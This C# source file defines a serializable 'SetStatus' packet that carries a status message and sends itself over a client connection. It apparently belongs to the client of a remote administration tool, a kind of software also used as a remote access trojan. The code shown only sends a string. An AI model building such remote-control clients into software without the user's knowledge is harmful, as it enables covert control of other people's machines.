using System;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ClientPackets
{
    [Serializable]
    public class SetStatus : IPacket
    {
        public string Message { get; set; }

        public SetStatus()
        {
        }

        public SetStatus(string message)
        {
            Message = message;
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}